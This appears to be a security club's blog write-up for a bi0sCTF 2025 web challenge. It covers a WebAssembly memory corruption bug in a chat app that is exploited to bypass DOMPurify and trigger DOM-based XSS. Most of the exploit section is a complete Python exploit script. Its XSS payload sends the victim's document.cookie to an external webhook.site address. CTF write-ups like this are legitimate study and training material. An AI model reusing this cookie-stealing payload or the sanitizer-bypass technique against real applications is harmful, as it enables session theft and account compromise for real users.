@@ -1,0 +1,107 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Wasaap2</title><meta content=Wasaap2 name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Wasaaap2/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=Wasaap2 property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Wasaaap2/ property=twitter:url><meta content=Wasaap2 property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Wasaaap2/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>Wasaaap2</span></div><time datetime=2025-07-08>Published on: <span class=accent-data>2025-07-08</span></time><address rel=author>By <span class=accent-data> Thirukailash, and exploiitm </span></address><h1>Wasaap2</h1><h2 id=challenge-summary>Challenge Summary</h2><p>The challenge presented a web-based chat interface with client-side WebAssembly (WASM) logic to handle message rendering and manipulation. Messages could be added, edited, and deleted, and each user’s state was serialized into a base64-encoded query string (<code>?s=...</code>). A bot visited user-generated states with a sensitive <code>Flag</code> cookie set.<p>The goal was to execute arbitrary JavaScript in the context of the bot to exfiltrate the <code>Flag</code> cookie.<hr><h2 id=vulnerability>Vulnerability</h2><p>The core issue was a memory corruption bug in the WASM module. By manipulating message creation and editing sequences, we achieved an <strong>arbitrary read/write</strong> primitive over the cached message structures in memory.<p>This allowed us to:<ul><li>Replace safe HTML tags (like <code>&LTdiv></code>) with unsanitized tags (like <code>&LTxmp></code>)<li>Bypass DOMPurify’s filtering and trigger a <strong>DOM-based XSS</strong></ul><hr><h2 id=exploit-strategy>Exploit Strategy</h2><ol><li><strong>Heap Grooming</strong>: Repeated <code>addmsg()</code> calls were used to layout memory and align controlled chunks.<li><strong>Structure Overlap</strong>: A corrupted <code>cached_msg</code> object pointed into another, allowing us to overwrite tag names and bypass sanitization.<li><strong>XSS Payload Injection</strong>: The <code>editmsg()</code> function placed a <code>&LTxmp>&LTimg onerror=...></code> payload into the message content.<li><strong>Trigger Exfiltration</strong>: The XSS sent <code>document.cookie</code> to a webhook.</ol><hr><h2 id=exploit>Exploit</h2><pre class=language-Python data-lang=Python style=background:#282828;color:#fdf4c1aa><code class=language-Python data-lang=Python><span style=color:#fa5c4b>import </span><span>os
+</span><span style=color:#fa5c4b>import </span><span>sys
+</span><span style=color:#fa5c4b>import </span><span>json
+</span><span style=color:#fa5c4b>import </span><span>base64
+</span><span style=color:#fa5c4b>import </span><span>urllib.parse
+</span><span style=color:#fa5c4b>import </span><span>argparse
+</span><span>
+</span><span>parser </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>argparse.ArgumentParser()
+</span><span style=color:#fdf4c1>parser.add_argument(</span><span style=color:#b8bb26>"--sync"</span><span style=color:#fdf4c1>, action</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"store_true"</span><span style=color:#fdf4c1>, help</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"Build and sync WASM module"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>parser.add_argument(</span><span style=color:#b8bb26>"--admin"</span><span style=color:#fdf4c1>, action</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"store_true"</span><span style=color:#fdf4c1>, help</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"Launch with admin access"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>parser.add_argument(</span><span style=color:#b8bb26>"--port"</span><span style=color:#fdf4c1>, type</span><span style=color:#fe8019>=</span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>, help</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"Target app port"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>parser.add_argument(</span><span style=color:#b8bb26>"--xss"</span><span style=color:#fdf4c1>, action</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"store_true"</span><span style=color:#fdf4c1>, help</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"Enable XSS delivery mode"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>parser.add_argument(</span><span style=color:#b8bb26>"--debug"</span><span style=color:#fdf4c1>, action</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"store_true"</span><span style=color:#fdf4c1>, help</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"Launch in debug browser mode"</span><span style=color:#fdf4c1>)
+</span><span>args </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>parser.parse_args()
+</span><span>
+</span><span style=font-style:italic;color:#928374># Default port
+</span><span>port </span><span style=color:#fe8019>= </span><span>args.port </span><span style=color:#fe8019>or </span><span style=color:#d3869b>5501
+</span><span>
+</span><span>browser </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"/usr/bin/google-chrome-stable"
+</span><span style=color:#fa5c4b>if </span><span>args.xss:
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"[+] XSS MODE ENABLED"</span><span style=color:#fdf4c1>)
+</span><span>    browser </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"/usr/bin/firefox"
+</span><span style=color:#fa5c4b>if </span><span>args.debug:
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"[+] DEBUG MODE ENABLED"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span>args.sync:
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"[*] Building client..."</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>os.system(</span><span style=color:#b8bb26>"./build.sh"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>sys.exit(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>payload </span><span style=color:#fe8019>= </span><span>[]
+</span><span>message_ids </span><span style=color:#fe8019>= </span><span>[]
+</span><span>message_counter </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>add_message</span><span>(</span><span style=color:#fdf4c1>content</span><span>, </span><span style=color:#fdf4c1>timestamp</span><span style=color:#fe8019>=</span><span style=color:#d3869b>0</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>global </span><span>message_counter
+</span><span>    idx </span><span style=color:#fe8019>= </span><span>message_counter
+</span><span>    </span><span style=color:#fdf4c1>message_ids.append(idx)
+</span><span>    </span><span style=color:#fdf4c1>payload.append({
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"action"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"add"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"content"</span><span style=color:#fdf4c1>: content,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"time"</span><span style=color:#fdf4c1>: timestamp
+</span><span style=color:#fdf4c1>    })
+</span><span>    message_counter </span><span style=color:#fe8019>+= </span><span style=color:#d3869b>1
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>idx
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>delete_message</span><span>(</span><span style=color:#fdf4c1>index</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>index </span><span style=color:#fe8019>in </span><span>message_ids:
+</span><span>        </span><span style=color:#fdf4c1>message_ids.remove(index)
+</span><span>        </span><span style=color:#fdf4c1>payload.append({
+</span><span style=color:#fdf4c1>            </span><span style=color:#b8bb26>"action"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"delete"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>            </span><span style=color:#b8bb26>"msgId"</span><span style=color:#fdf4c1>: index
+</span><span style=color:#fdf4c1>        })
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>edit_message</span><span>(</span><span style=color:#fdf4c1>index</span><span>, </span><span style=color:#fdf4c1>new_content</span><span>, </span><span style=color:#fdf4c1>timestamp</span><span style=color:#fe8019>=</span><span style=color:#d3869b>0</span><span>):
+</span><span>    </span><span style=color:#fdf4c1>payload.append({
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"action"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"edit"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"msgId"</span><span style=color:#fdf4c1>: index,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"content"</span><span style=color:#fdf4c1>: new_content,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"time"</span><span style=color:#fdf4c1>: timestamp
+</span><span style=color:#fdf4c1>    })
+</span><span>
+</span><span style=font-style:italic;color:#928374># -------------------- Build Payload --------------------
+</span><span>
+</span><span style=font-style:italic;color:#928374># Heap grooming
+</span><span>allocated </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#fdf4c1>add_message(</span><span style=color:#b8bb26>"B" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>10</span><span style=color:#fdf4c1>)</span><span>]
+</span><span style=color:#fdf4c1>add_message(</span><span style=color:#b8bb26>"B" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>100</span><span style=color:#fdf4c1>)
+</span><span>[</span><span style=color:#fdf4c1>add_message(</span><span style=color:#fabd2f>chr</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0x61 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>i)) </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>7</span><span style=color:#fdf4c1>)</span><span>]
+</span><span style=color:#fdf4c1>add_message(</span><span style=color:#b8bb26>"hello"</span><span style=color:#fdf4c1>)
+</span><span>target_msg </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add_message(</span><span style=color:#b8bb26>"A"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Alignment padding
+</span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>11</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>i </span><span style=color:#fe8019>== </span><span style=color:#d3869b>8</span><span>:
+</span><span>        </span><span style=font-style:italic;color:#928374># XSS vector placed here
+</span><span>        xss_payload </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"&LTdiv id='&LT/xmp>&LTimg src=x onerror=window.open(\"https://webhook.site/fbd4abde-676b-4222-8e33-64107fe95661/?flag=\"+document.cookie)>'>&LT/div>"
+</span><span>        </span><span style=color:#fdf4c1>add_message(xss_payload.ljust(</span><span style=color:#d3869b>146</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"a"</span><span style=color:#fdf4c1>))
+</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>        </span><span style=color:#fdf4c1>add_message(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"block-</span><span style=color:#fdf4c1>{i </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>20</span><span style=color:#fdf4c1>}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Trigger allocation to overwrite target
+</span><span>overlap_msg </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add_message(</span><span style=color:#b8bb26>"zzz"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Mutate HTML rendering internals
+</span><span style=color:#fdf4c1>edit_message(</span><span style=color:#d3869b>18</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>chr</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0x35</span><span style=color:#fdf4c1>))
+</span><span style=color:#fdf4c1>edit_message(</span><span style=color:#d3869b>31</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"xmp"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>edit_message(</span><span style=color:#d3869b>18</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>chr</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0x3f</span><span style=color:#fdf4c1>))
+</span><span style=color:#fdf4c1>edit_message(</span><span style=color:#d3869b>31</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"xmp"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>edit_message(</span><span style=color:#d3869b>18</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"aaaa" </span><span style=color:#fe8019>+ </span><span style=color:#fabd2f>chr</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0x6c</span><span style=color:#fdf4c1>))
+</span><span style=color:#fdf4c1>delete_message(</span><span style=color:#d3869b>31</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># -------------------- Encode Payload --------------------
+</span><span>
+</span><span>encoded </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>json.dumps(payload, separators</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>','</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>':'</span><span style=color:#fdf4c1>))
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"[+] Raw JSON: </span><span style=color:#fdf4c1>{encoded}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>b64_payload </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>base64.b64encode(encoded.encode()).decode()
+</span><span>url_payload </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>urllib.parse.quote(b64_payload)
+</span><span>
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"[+] Encoded payload: </span><span style=color:#fdf4c1>{url_payload}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>base_url </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"http://127.0.0.1:</span><span>{</span><span style=color:#fdf4c1>port</span><span>}</span><span style=color:#b8bb26>/bot"
+</span><span>visit_url </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span>{</span><span style=color:#fdf4c1>base_url</span><span>}</span><span style=color:#b8bb26>?visit=</span><span>{</span><span style=color:#fdf4c1>url_payload</span><span>}</span><span style=color:#b8bb26>" </span><span style=color:#fa5c4b>if </span><span>args.admin </span><span style=color:#fa5c4b>else </span><span>base_url
+</span><span>
+</span><span style=color:#fdf4c1>os.system(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{browser}</span><span style=color:#b8bb26> --new-tab \"</span><span style=color:#fdf4c1>{visit_url}</span><span style=color:#b8bb26>\""</span><span style=color:#fdf4c1>)
+</span><span>
+</span></code></pre><hr><h2 id=final-payload-execution>Final Payload Execution</h2><p>The script sets up:<ul><li><code>addmsg()</code> to fill up memory<li><code>editmsg()</code> to overwrite structure fields<li><code>delmsg()</code> to release memory<li>Custom tag rewrites (<code>div</code> → <code>xmp</code>)</ul><hr><h2 id=takeaways>Takeaways</h2><p>This challenge demonstrated practical exploitation of:<ul><li>WebAssembly memory structure manipulation<li>DOMPurify bypass through tag corruption<li>Arbitrary read/write primitives in client-side VMs<li>Real-world exploitation of serialization-based XSS</ul><hr><p>Huge thanks to <strong>bi0sCTF</strong> for this excellent challenge. It was a fun and insightful exercise into memory layout exploitation and browser-based attack surfaces.<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
